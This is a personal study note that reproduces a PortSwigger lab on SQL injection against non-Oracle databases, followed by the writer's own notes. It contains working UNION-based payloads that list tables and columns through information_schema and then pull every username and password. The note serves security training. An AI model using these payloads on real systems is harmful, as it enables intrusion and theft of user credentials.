


Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== MyDatabase dbo Products BASE TABLE MyDatabase dbo Users BASE TABLE MyDatabase dbo Feedback BASE TABLE`

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

`TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= MyDatabase dbo Users UserId int MyDatabase dbo Users Username varchar MyDatabase dbo Users Password varchar`

This output shows the columns in the specified table and the data type of each column.



## Lab: SQL injection attack, listing the database contents on non-Oracle databases

PRACTITIONER

LABSolved

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

 ####  Hint

[](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[ACCESS THE LAB](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle#)

 ####  Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
    `'+UNION+SELECT+'abc','def'--`
3. Use the following payload to retrieve the list of tables in the database:
    
    `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
    
    `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
    
    `'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`
8. Find the password for the `administrator` user, and use it to log in.


----
----

note


![[../../../images/Pasted image 20231024221107.png]]




# to list the tables
select * from information_schema.tables

 This returns output like the following:
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE

This output indicates that there are three tables, called Products, Users, and Feedback. 

`in payload format`

'union select table_name , NULL from information_schema.tables --

`this upper commands displays all the table name , now we have to select any one of the table which seems fruitful`

####lets say table selected is 'users_bondfq'


----

now we have to find the columns in the column

payload format

`union select column_name , NULL form information_schema.columns where table_name = 'users_bondfq' --`


-----

now we have to find the select fruitful column

payload format
`union select column1, column2 from table_name --`



